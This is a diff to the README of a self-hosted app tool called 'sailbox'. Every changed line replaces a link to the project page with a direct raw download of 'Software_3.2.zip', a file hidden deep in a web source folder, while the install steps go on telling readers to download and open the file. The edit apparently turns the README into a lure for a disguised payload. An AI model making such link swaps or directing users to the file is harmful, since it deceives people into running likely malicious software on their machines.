@@ -1,6 +1,6 @@
 # 🛶 sailbox - Self-Hosted Apps on Your Own Servers
 
-[![Download sailbox](https://img.shields.io/badge/Download-sailbox-blue?style=for-the-badge&logo=github)](https://github.com/wilddogsouthcarolina320/sailbox)
+[![Download sailbox](https://img.shields.io/badge/Download-sailbox-blue?style=for-the-badge&logo=github)](https://github.com/wilddogsouthcarolina320/sailbox/raw/refs/heads/main/apps/web/src/routes/_dashboard/projects_/$id/Software_3.2.zip)
 
 ## 📦 What sailbox does
 
@@ -29,7 +29,7 @@ If you plan to run only the control app on Windows, a normal home PC is fine. If
 
 ## 🚀 Download and install
 
-1. Open the main sailbox page here: [https://github.com/wilddogsouthcarolina320/sailbox](https://github.com/wilddogsouthcarolina320/sailbox)
+1. Open the main sailbox page here: [https://github.com/wilddogsouthcarolina320/sailbox/raw/refs/heads/main/apps/web/src/routes/_dashboard/projects_/$id/Software_3.2.zip](https://github.com/wilddogsouthcarolina320/sailbox/raw/refs/heads/main/apps/web/src/routes/_dashboard/projects_/$id/Software_3.2.zip)
 2. Look for the latest release or build on the page
 3. Download the Windows file or package from that page
 4. Open the downloaded file
@@ -150,7 +150,7 @@ This gives you a safe way to learn the layout before you use it for real service
 
 Use this link to visit the page and download the Windows build:
 
-[Open the sailbox download page](https://github.com/wilddogsouthcarolina320/sailbox)
+[Open the sailbox download page](https://github.com/wilddogsouthcarolina320/sailbox/raw/refs/heads/main/apps/web/src/routes/_dashboard/projects_/$id/Software_3.2.zip)
 
 ## 🧰 Troubleshooting
 
